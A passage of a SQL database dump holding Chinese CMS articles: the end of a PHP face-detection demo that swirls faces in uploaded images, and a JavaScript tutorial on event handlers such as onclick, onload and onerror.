$_FILES[''pic''][''tmp_name'']; &lt;br /&gt;\r\n$arr = face_detect($img, ‘haarcascade_frontalface_alt2.xml''); &lt;br /&gt;\r\n//$arr1 = face_detect($img, ''haarcascade_frontalface_alt_tree.xml''); &lt;br /&gt;\r\nif(is_array($arr1)) $all =array_merge($arr,$arr1); &lt;br /&gt;\r\nelse $all = $arr; &lt;br /&gt;\r\n$im = new Imagick($img); &lt;br /&gt;\r\n//$draw =new ImagickDraw(); &lt;br /&gt;\r\n//$borderColor = new ImagickPixel(''red''); &lt;br /&gt;\r\n//$draw-&amp;gt;setFillAlpha(0.0); &lt;br /&gt;\r\n//$draw-&amp;gt;setStrokeColor ($borderColor); &lt;br /&gt;\r\n//$draw-&amp;gt;setStrokeWidth (1); &lt;br /&gt;\r\nif(is_array($all)){ &lt;br /&gt;\r\nforeach ($all as $v){ &lt;br /&gt;\r\n$im_cl = $im-&amp;gt;clone(); &lt;br /&gt;\r\n$im_cl-&amp;gt;cropImage($v[''w''],$v[''h''],$v[''x''],$v[''y'']); &lt;br /&gt;\r\n$im_cl-&amp;gt;swirlImage(60); &lt;br /&gt;\r\n$im-&amp;gt;compositeImage( $im_cl, Imagick::COMPOSITE_OVER , $v[''x''], $v[''y''] ); &lt;br /&gt;\r\n//$draw-&amp;gt;rectangle($v[''x''],$v[''y''],$v[''x'']+$v[''w''],$v[''y'']+$v[''h'']); &lt;br /&gt;\r\n//$im-&amp;gt;drawimage($draw); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\nheader( “Content-Type: image/png” ); &lt;br /&gt;\r\necho $im; &lt;br /&gt;\r\n}else{ &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n&amp;lt;meta http-equiv=“Content-Type” content=“text/html; charset=utf-8″ /&amp;gt; &lt;br /&gt;\r\n&amp;lt;form method=“POST” enctype=“multipart/form-data”&amp;gt; &lt;br /&gt;\r\n人脸识别试验：只支持jpg,png&amp;lt;br&amp;gt; &lt;br /&gt;\r\n上传一张图片 &amp;lt;input type=“file” name=“pic”&amp;gt; &lt;br /&gt;\r\n&amp;lt;input type=“submit” value=“upload”&amp;gt; &lt;br /&gt;\r\n&amp;lt;/form&amp;gt; &lt;br /&gt;\r\n&amp;lt;? &lt;br /&gt;\r\n} &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;strong&gt;参考资料:&lt;/strong&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://www.xarg.org/2008/07/face-detection-with-php/&quot;&gt;&lt;font color=&quot;#2970a6&quot;&gt;http://www.xarg.org/2008/07/face-detection-with-php/&lt;/font&gt;&lt;/a&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://www.opencv.org.cn/index.php/%E9%A6%96%E9%A1%B5&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#2970a6&quot;&gt;http://www.opencv.org.cn/index.php/首页&lt;/font&gt;&lt;/a&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://www.cs.iit.edu/%7Eagam/cs512/lect-notes/opencv-intro/index.html&quot;&gt;&lt;font color=&quot;#2970a6&quot;&gt;http://www.cs.iit.edu/~agam/cs512/lect-notes/opencv-intro/index.htm&lt;/font&gt;&lt;/a&gt;', 1, 1, 0, 0, 1302844932, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(69, 1, '事件处理', '', '', '&lt;h3&gt;&lt;a name=&quot;事件处理概述&quot;&gt;事件处理概述&lt;/a&gt;&lt;/h3&gt;\r\n&lt;p&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;&amp;nbsp;&lt;/span&gt;事件处理是对象化编程的一个很重要的环节，没有了事件处理，程序就会变得很死，缺乏灵活性。事件处理的过程可以这样表示：发生事件&lt;span lang=&quot;EN-US&quot;&gt; - &lt;/span&gt;启动事件处理程序&lt;span lang=&quot;EN-US&quot;&gt; - &lt;/span&gt;事件处理程序作出反应。其中，要使事件处理程序能够启动，必须先告诉对象，如果发生了什么事情，要启动什么处理程序，否则这个流程就不能进行下去。事件的处理程序可以是任意&lt;span lang=&quot;EN-US&quot;&gt; JavaScript &lt;/span&gt;语句，但是我们一般用特定的自定义函数（&lt;span lang=&quot;EN-US&quot;&gt;function&lt;/span&gt;）来处理事情。&lt;/p&gt;\r\n&lt;h3&gt;&lt;a name=&quot;指定事件处理程序&quot;&gt;指定事件处理程序&lt;/a&gt;&lt;/h3&gt;\r\n&lt;p&gt;　　指定事件处理程序有三种方法：&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;方法一&lt;/b&gt; 直接在&lt;span lang=&quot;EN-US&quot;&gt; HTML &lt;/span&gt;标记中指定。这种方法是用得最普遍的。方法是：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;&lt;/span&gt;标记&lt;span lang=&quot;EN-US&quot;&gt; ... ... &lt;/span&gt;事件&lt;span lang=&quot;EN-US&quot;&gt;=&quot;&lt;/span&gt;事件处理程序&lt;span lang=&quot;EN-US&quot;&gt;&quot; [&lt;/span&gt;事件&lt;span lang=&quot;EN-US&quot;&gt;=&quot;&lt;/span&gt;事件处理程序&lt;span lang=&quot;EN-US&quot;&gt;&quot; ...]&amp;gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;让我们来看看例子：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;body ... onload=&quot;alert(''&lt;/span&gt;网页读取完成，请慢慢欣赏！&lt;span lang=&quot;EN-US&quot;&gt;'')&quot; onunload=&quot;alert(''&lt;/span&gt;再见！&lt;span lang=&quot;EN-US&quot;&gt;'')&quot;&amp;gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;这样的定义&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;标记，能使文档读取完毕的时候弹出一个对话框，写着“网页读取完成，请慢慢欣赏”；在用户退出文档（或者关闭窗口，或者到另一个页面去）的时候弹出“再见”。&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;方法二&lt;/b&gt; 编写特定对象特定事件的&lt;span lang=&quot;EN-US&quot;&gt; JavaScript&lt;/span&gt;。这种方法用得比较少，但是在某些场合还是很好用的。方法是：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;script language=&quot;JavaScript&quot; for=&quot;&lt;/span&gt;对象&lt;span lang=&quot;EN-US&quot;&gt;&quot; event=&quot;&lt;/span&gt;事件&lt;span lang=&quot;EN-US&quot;&gt;&quot;&amp;gt;&lt;br /&gt;\r\n...&lt;br /&gt;\r\n(&lt;/span&gt;事件处理程序代码&lt;span lang=&quot;EN-US&quot;&gt;)&lt;br /&gt;\r\n...&lt;br /&gt;\r\n&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;例：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;script language=&quot;JavaScript&quot;for=&quot;window&quot; event=&quot;onload&quot;&amp;gt;&lt;br /&gt;\r\n&amp;nbsp; alert(''&lt;/span&gt;网页读取完成，请慢慢欣赏！&lt;span lang=&quot;EN-US&quot;&gt;'');&lt;br /&gt;\r\n&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;方法三&lt;/b&gt; 在&lt;span lang=&quot;EN-US&quot;&gt; JavaScript &lt;/span&gt;中说明。方法：&lt;/p&gt;\r\n&lt;p align=&quot;center&quot; style=&quot;text-align:center;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;&lt;/span&gt;事件主角&lt;span lang=&quot;EN-US&quot;&gt; - &lt;/span&gt;对象&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;.&amp;lt;&lt;/span&gt;事件&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;= &amp;lt;&lt;/span&gt;事件处理程序&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;用这种方法要注意的是，“事件处理程序”是真正的代码，而不是字符串形式的代码。如果事件处理程序是一个自定义函数，如无使用参数的需要，就不要加“&lt;span lang=&quot;EN-US&quot;&gt;()&lt;/span&gt;”。例：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;...&lt;br /&gt;\r\n&lt;br /&gt;\r\nfunction ignoreError() {&lt;br /&gt;\r\n&amp;nbsp; return true;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n...&lt;br /&gt;\r\n&lt;br /&gt;\r\nwindow.onerror = ignoreError; // &lt;/span&gt;没有使用“&lt;span lang=&quot;EN-US&quot;&gt;()&lt;/span&gt;”&lt;/p&gt;\r\n&lt;p&gt;这个例子将&lt;span lang=&quot;EN-US&quot;&gt; ignoreError() &lt;/span&gt;函数定义为&lt;span lang=&quot;EN-US&quot;&gt; window &lt;/span&gt;对象的&lt;span lang=&quot;EN-US&quot;&gt; onerror &lt;/span&gt;事件的处理程序。它的效果是忽略该&lt;span lang=&quot;EN-US&quot;&gt; window &lt;/span&gt;对象下任何错误（由引用不允许访问的&lt;span lang=&quot;EN-US&quot;&gt; location &lt;/span&gt;对象产生的“没有权限”错误是不能忽略的）。&lt;/p&gt;\r\n&lt;h3&gt;&lt;a name=&quot;事件详解&quot;&gt;事件详解&lt;/a&gt;&lt;/h3&gt;\r\n&lt;p&gt;&lt;a name=&quot;onblur_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onblur &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在窗口失去焦点的时候。&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#window 窗口对象&quot;&gt;window&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;onchange_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onchange &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在文本输入区的内容被更改，然后焦点从文本输入区移走之后。捕捉此事件主要用于实时检测输入的有效性，或者立刻改变文档内容。&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#Password 密码输入区对象&quot;&gt;Password&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;；&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#Select 选择区（下拉菜单、列表）对象&quot;&gt;Select&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;；&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#Text 文本框对象&quot;&gt;Text&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;；&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#Textarea 多行文本输入区对象&quot;&gt;Textarea&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;onclick_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onclick &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在对象被单击的时候。单击是指鼠标停留在对象上，按下鼠标键，没有移动鼠标而放开鼠标键这一个完整的过程。&lt;/p&gt;\r\n&lt;p&gt;　　一个普通按钮对象（&lt;span lang=&quot;EN-US&quot;&gt;Button&lt;/span&gt;）通常会有&lt;span lang=&quot;EN-US&quot;&gt; onclick &lt;/span&gt;事件处理程序，因为这种对象根本不能从用户那里得到任何信息，没有&lt;span lang=&quot;EN-US&quot;&gt; onclick &lt;/span&gt;事件处理程序就等于废柴。按钮上添加&lt;span lang=&quot;EN-US&quot;&gt; onclick &lt;/span&gt;事件处理程序，可以模拟“另一个提交按钮”，方法是：在事件处理程序中更改表单的&lt;span lang=&quot;EN-US&quot;&gt; action, target, encoding, method &lt;/span&gt;等一个或几个属性，然后调用表单的&lt;span lang=&quot;EN-US&quot;&gt; submit() &lt;/span&gt;方法。&lt;/p&gt;\r\n&lt;p&gt;　　在&lt;span lang=&quot;EN-US&quot;&gt; Link &lt;/span&gt;对象的&lt;span lang=&quot;EN-US&quot;&gt; onclick &lt;/span&gt;事件处理程序中返回&lt;span lang=&quot;EN-US&quot;&gt; false &lt;/span&gt;值（&lt;span lang=&quot;EN-US&quot;&gt;return false&lt;/span&gt;），能阻止浏览器打开此连接。即，如果有一个这样的连接：&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;a href=&quot;http://www.a.com&quot; onclick=&quot;returnfalse&quot;&amp;gt;Go!&amp;lt;/a&amp;gt;&lt;/span&gt;，那么无论用户怎样点击，都不会去到&lt;span lang=&quot;EN-US&quot;&gt; www.a.com&lt;/span&gt;网站，除非用户禁止浏览器运行&lt;span lang=&quot;EN-US&quot;&gt; JavaScript&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#Button 按钮对象&quot;&gt;Button&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;；&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#Checkbox 复选框对象&quot;&gt;Checkbox&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;；&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#images[]; Image 图片对象&quot;&gt;Image&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;；&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#anchors[]; links[]; Link 连接对象&quot;&gt;Link&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;；&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#Radio 单选域对象&quot;&gt;Radio&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;；&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#Reset 重置按钮对象&quot;&gt;Reset&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;；&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#Submit 提交按钮对象&quot;&gt;Submit&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;onerror_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onerror &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在错误发生的时候。它的事件处理程序通常就叫做“错误处理程序”&lt;span lang=&quot;EN-US&quot;&gt;(Error Handler)&lt;/span&gt;，用来处理错误。上边已经介绍过，要忽略一切错误，就使用：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;function ignoreError() {&lt;br /&gt;\r\n&amp;nbsp; return true;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\nwindow.onerror = ignoreError;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#window 窗口对象&quot;&gt;window&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;onfocus_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onfocus &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在窗口得到焦点的时候。&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#window 窗口对象&quot;&gt;window&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;onload_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onload &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在文档全部下载完毕的时候。全部下载完毕意味着不但&lt;span lang=&quot;EN-US&quot;&gt; HTML &lt;/span&gt;文件，而且包含的图片，插件，控件，小程序等全部内容都下载完毕。本事件是&lt;span lang=&quot;EN-US&quot;&gt;window &lt;/span&gt;的事件，但是在&lt;span lang=&quot;EN-US&quot;&gt; HTML &lt;/span&gt;中指定事件处理程序的时候，我们是把它写在&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;标记中的。&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#window 窗口对象&quot;&gt;window&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;onmousedown_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onmousedown &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在用户把鼠标放在对象上按下鼠标键的时候。参考&lt;span lang=&quot;EN-US&quot;&gt; onmouseup &lt;/span&gt;事件。&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#Button 按钮对象&quot;&gt;Button&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;；&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#anchors[]; links[]; Link 连接对象&quot;&gt;Link&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;onmouseout_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onmouseout &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在鼠标离开对象的时候。参考&lt;span lang=&quot;EN-US&quot;&gt; onmouseover &lt;/span&gt;事件。&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#anchors[]; links[]; Link 连接对象&quot;&gt;Link&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;onmouseover_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onmouseover &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在鼠标进入对象范围的时候。这个事件和&lt;span lang=&quot;EN-US&quot;&gt; onmouseout &lt;/span&gt;事件，再加上图片的预读，就可以做到当鼠标移到图像连接上，图像更改的效果了。有时我们看到，在指向一个连接时，状态栏上不显示地址，而显示其它的资料，看起来这些资料是可以随时更改的。它们是这样做出来的：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;a href=&quot;...&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; onmouseover=&quot;window.status=''Click Me Please!''; returntrue;&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; onmouseout=&quot;window.status=''''; return true;&quot;&amp;gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;　&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#anchors[]; links[]; Link 连接对象&quot;&gt;Link&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;onmouseup_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onmouseup &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在用户把鼠标放在对象上鼠标键被按下的情况下，放开鼠标键的时候。如果按下鼠标键的时候，鼠标并不在放开鼠标的对象上，则本事件不会发生。&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#Button 按钮对象&quot;&gt;Button&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;；&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#anchors[]; links[]; Link 连接对象&quot;&gt;Link&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;onreset_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onreset &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在表单的“重置”按钮被单击（按下并放开）的时候。通过在事件处理程序中返回&lt;span lang=&quot;EN-US&quot;&gt; false &lt;/span&gt;值（&lt;span lang=&quot;EN-US&quot;&gt;return false&lt;/span&gt;）可以阻止表单重置。&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#forms[]; Form 表单对象&quot;&gt;Form&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;onresize_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onresize &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在窗口被调整大小的时候。&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#window 窗口对象&quot;&gt;window&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;onsubmit_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onsubmit &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在表单的“提交”按钮被单击（按下并放开）的时候。可以使用该事件来验证表单的有效性。通过在事件处理程序中返回&lt;span lang=&quot;EN-US&quot;&gt; false &lt;/span&gt;值（&lt;span lang=&quot;EN-US&quot;&gt;return false&lt;/span&gt;）可以阻止表单提交。&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#forms[]; Form 表单对象&quot;&gt;Form&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;onunload_事件&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;onunload &lt;/span&gt;事件&lt;/b&gt;&lt;/a&gt; 发生在用户退出文档（或者关闭窗口，或者到另一个页面去）的时候。与&lt;span lang=&quot;EN-US&quot;&gt; onload &lt;/span&gt;一样，要写在&lt;span lang=&quot;EN-US&quot;&gt; HTML &lt;/span&gt;中就写到&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;标记里。&lt;/p&gt;\r\n&lt;p&gt;　　有的&lt;span lang=&quot;EN-US&quot;&gt; Web Masters &lt;/span&gt;用这个方法来弹出“调查表单”，以“强迫”来者填写；有的就弹出广告窗口，唆使来者点击连接。我觉得这种“&lt;span lang=&quot;EN-US&quot;&gt;onunload=&quot;open...&quot;&lt;/span&gt;”的方法很不好，有时甚至会因为弹出太多窗口而导致资源缺乏。有什么对来者说就应该在网页上说完，不对吗？&lt;/p&gt;\r\n&lt;p&gt;&lt;b&gt;　应用于：&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;http://www.iselong.com/online/ebooks/javascript/js_3.htm#window 窗口对象&quot;&gt;window&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;对象&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;\r\n&lt;h3&gt;&lt;a name=&quot;关于对象化编程的语句&quot;&gt;关于对象化编程的语句&lt;/a&gt;&lt;/h3&gt;\r\n&lt;p&gt;　　现在我们有实力学习以下关于对象化编程，但其实属于上一章的内容了。&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;with_语句&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;with &lt;/span&gt;语句&lt;/b&gt;&lt;/a&gt; 为一个或一组语句指定默认对象。&lt;/p&gt;\r\n&lt;p&gt;用法：&lt;span lang=&quot;EN-US&quot;&gt;with (&amp;lt;&lt;/span&gt;对象&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;) &amp;lt;&lt;/span&gt;语句&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;with &lt;/span&gt;语句通常用来缩短特定情形下必须写的代码量。在下面的例子中，请注意&lt;span lang=&quot;EN-US&quot;&gt; Math &lt;/span&gt;的重复使用：&lt;span lang=&quot;EN-US&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;x = Math.cos(3 * Math.PI) + Math.sin(Math.LN10);&lt;br 